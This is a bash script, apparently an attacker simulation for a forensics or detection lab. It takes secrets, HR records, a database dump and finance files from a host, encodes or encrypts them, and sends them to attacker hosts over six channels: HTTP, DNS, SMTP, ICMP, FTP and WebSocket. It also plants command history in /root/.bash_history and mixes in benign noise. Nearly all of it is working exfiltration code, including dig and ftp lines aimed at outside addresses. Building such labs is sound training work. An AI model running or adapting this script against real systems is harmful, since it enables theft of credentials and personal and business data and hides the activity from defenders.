#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT/config.env"

# ---- helper functions ----

xor_file() {
  python3 - "$1" "$2" "$3" <<'PY'
import sys
a,b,k=sys.argv[1],sys.argv[2],sys.argv[3].encode()
d=open(a,'rb').read()
open(b,'wb').write(bytes(x^k[i%len(k)] for i,x in enumerate(d)))
PY
}

benign(){ echo "    [benign activity...]" && "$ROOT/victim/benign_activity.sh" || true; sleep 1; }
hist(){ cat >>/root/.bash_history; }

echo "============================================"
echo "  Six Ways Out — Attacker Simulation"
echo "  Victim: $(hostname)"
echo "  Time:   $(date -u)"
echo "============================================"

# ======================================================================
# 0. Initial benign activity
# ======================================================================
echo ""
echo "[0/6] Initial benign activity..."

hist <<'EOF'
cd /var/www
pwd
ls -lah
systemctl status nginx --no-pager
df -h
free -m
uptime
who
ps aux --sort=-%cpu | head -20
ss -lntup
cat /etc/hostname
cat /etc/os-release
cd /tmp
umask 077
ls -lah
date -u
EOF
benign

# ======================================================================
# 1. HTTP exfiltration — production.env
#    XOR with mango-47 -> Base64 -> HTTP POST
#    Key recovered via: printf 'bWFuZ28tNDc=' | base64 -d
# ======================================================================
echo ""
echo "[1/6] HTTP exfiltration (production.env -> $HTTP_IP)..."

hist <<'EOF'
ls -lah /opt/app/config
stat /opt/app/config/production.env
cat /opt/app/config/production.env > /tmp/.u1
wc -c /tmp/.u1
sha256sum /tmp/.u1
printf 'bWFuZ28tNDc=' | base64 -d > /tmp/.k1
EOF
echo "  XOR encoding..."
xor_file /opt/app/config/production.env /tmp/.u1.xor "$HTTP_KEY"
echo "  Base64 encoding..."
base64 -w0 /tmp/.u1.xor >/tmp/.u1.b64
echo "  HTTP POST to $HTTP_IP..."
curl -sS -X POST "http://$HTTP_IP/api/update" --data-binary @/tmp/.u1.b64 >/dev/null 2>&1 || true
rm -f /tmp/.u1.xor /tmp/.u1.b64
echo "  [✓] HTTP exfiltration complete"
benign

# ======================================================================
# 2. DNS exfiltration — employee_records.csv
#    Base32 -> 30-char chunks -> DNS queries to explicit DNS server
# ======================================================================
echo ""
echo "[2/6] DNS exfiltration (employee_records.csv -> $DNS_IP)..."

hist <<'EOF'
ls -lah /opt/hr
stat /opt/hr/employee_records.csv
head -5 /opt/hr/employee_records.csv
cat /opt/hr/employee_records.csv > /tmp/.u2
wc -l /tmp/.u2
python3 -c "import base64; open('/tmp/.b32','w').write(base64.b32encode(open('/tmp/.u2','rb').read()).decode())"
fold -w 30 /tmp/.b32 | head
for x in $(cat /tmp/.b32 | fold -w 30); do dig +short ${x}.exfil.example @203.0.113.53; done
dig +short metrics.internal.example
dig +short logging.internal.example
cat /etc/resolv.conf
EOF
echo "  Base32 encoding..."
python3 -c "import base64; open('/tmp/.b32','w').write(base64.b32encode(open('/opt/hr/employee_records.csv','rb').read()).decode())"
echo "  Sending DNS queries..."
count=0
while read -r x; do
  dig +short "$x.$DNS_DOMAIN" @"$DNS_IP" >/dev/null 2>&1 || true
  count=$((count+1))
  [ $((count % 10)) -eq 0 ] && echo "    $count queries sent..."
  sleep .15
done < <(fold -w 30 /tmp/.b32)
echo "  Total: $count DNS queries sent"
rm -f /tmp/.b32
echo "  [✓] DNS exfiltration complete"
benign

# ======================================================================
# 3. SMTP exfiltration — QR code PNGs via email
#    Three emails with real QR PNG MIME attachments
# ======================================================================
echo ""
echo "[3/6] SMTP exfiltration (QR codes via email -> $SMTP_IP)..."

hist <<'EOF'
printf '%s\n' 'Monthly reconciliation completed.' > /tmp/note
mailq
python3 /opt/smtp_sender.py --smtp-host 203.0.113.25
mailq
EOF
echo "  Sending 3 QR-coded emails..."
python3 "$ROOT/attacker/smtp_sender.py" --smtp-host "$SMTP_IP" --recipient "$SMTP_RECIPIENT" || true
echo "  [✓] SMTP exfiltration complete"
benign

# ======================================================================
# 4. ICMP exfiltration — db.dump
#    XOR with raven-19 -> hex -> chunks -> ICMP Echo Requests
#    Key recovered via: printf 'cmF2ZW4tMTk=' | base64 -d
# ======================================================================
echo ""
echo "[4/6] ICMP exfiltration (db.dump -> $ICMP_IP)..."

hist <<'EOF'
printf 'cmF2ZW4tMTk=' | base64 -d > /tmp/.k4
cat /var/backups/db.dump > /tmp/.u4
wc -c /tmp/.u4
xxd -p /tmp/.u4 | tr -d '\n' > /tmp/.hex
wc -c /tmp/.hex
head -c 64 /tmp/.hex
ping -c 1 192.0.2.91
EOF
echo "  XOR encoding..."
xor_file /var/backups/db.dump /tmp/.u4.xor "$ICMP_KEY"
echo "  Hex encoding..."
xxd -p /tmp/.u4.xor | tr -d '\n' > /tmp/.hex
echo "  Sending ICMP packets..."
# SCAPY_SUPPRESS_LAYERS suppresses the mspac layer loading error on Python 3.4
SCAPY_SUPPRESS_LAYERS=mspac python3 "$ROOT/attacker/icmp_sender.py" --hex-file /tmp/.hex --dest "$ICMP_IP" --chunk-size 56 2>/dev/null || true
rm -f /tmp/.u4.xor
echo "  [✓] ICMP exfiltration complete"
benign

# ======================================================================
# 5. FTP exfiltration — q3_forecast.xlsx
#    gzip -> Base64 -> FTP upload
# ======================================================================
echo ""
echo "[5/6] FTP exfiltration (q3_forecast.xlsx -> $FTP_IP)..."

hist <<'EOF'
ls -lah /opt/finance
stat /opt/finance/q3_forecast.xlsx
gzip -c /opt/finance/q3_forecast.xlsx > /tmp/.gz
ls -lh /tmp/.gz
base64 -w0 /tmp/.gz > /tmp/.u5
wc -c /tmp/.u5
ftp -inv 203.0.113.88
EOF
echo "  Compressing and encoding..."
gzip -c /opt/finance/q3_forecast.xlsx >/tmp/.gz
base64 -w0 /tmp/.gz >/tmp/.u5
if command -v ftp >/dev/null; then
echo "  Uploading via FTP..."
# Use set +H to disable history expansion which can interfere with ! in passwords
set +H
ftp -inv "$FTP_IP" <<EOF || true
user $FTP_USER $FTP_PASSWORD
binary
put /tmp/.u5 daily_metrics.dat
bye
EOF
set -H 2>/dev/null || true
echo "  [✓] FTP exfiltration complete"
else
echo "  [!] ftp command not found, skipping"
fi
benign

# ======================================================================
# 6. WebSocket exfiltration — release-notes.txt
#    AES-256-CBC + PBKDF2 + salt -> Base64 -> WebSocket
#    Password recovered via: printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d
# ======================================================================
echo ""
echo "[6/6] WebSocket exfiltration (release-notes.txt -> $WS_IP:8080)..."

hist <<'EOF'
cat /srv/app/releases/release-notes.txt > /tmp/.u6
wc -c /tmp/.u6
printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d > /tmp/.k6
openssl enc -aes-256-cbc -salt -md sha256 -pass file:/tmp/.k6 -in /tmp/.u6 -out /tmp/.u6.enc
ls -lh /tmp/.u6.enc
base64 -w0 /tmp/.u6.enc
EOF
echo "  Encrypting with AES-256-CBC..."
printf '%s' "$WS_PASSWORD" > /tmp/.k6
openssl enc -aes-256-cbc -salt -md sha256 -pass file:/tmp/.k6 -in /srv/app/releases/release-notes.txt -out /tmp/.u6.enc
echo "  Sending via WebSocket..."
python3 "$ROOT/attacker/websocket_client.py" --url "ws://$WS_IP:8080/exfil" --file /tmp/.u6.enc || true
echo "  [✓] WebSocket exfiltration complete"

# ======================================================================
# Cleanup
# ======================================================================

rm -f /tmp/.u1 /tmp/.u2 /tmp/.u4 /tmp/.u5 /tmp/.u6 /tmp/.k1 /tmp/.k4 /tmp/.k6 /tmp/.hex /tmp/.gz /tmp/.b32 /tmp/.u6.enc /tmp/note /tmp/.u1.xor /tmp/.u4.xor

hist <<'EOF'
find /tmp -maxdepth 1 -type f -printf '%p\n'
history | tail -20
journalctl --since "15 minutes ago" --no-pager | tail -50
ss -antp
ps aux --sort=-%mem | head -15
df -h
free -m
uptime
logout
EOF
echo ""
echo "============================================"
echo "  Simulation Complete!"
echo "  All 6 exfiltration channels executed."
echo "  Time: $(date -u)"
echo "============================================"
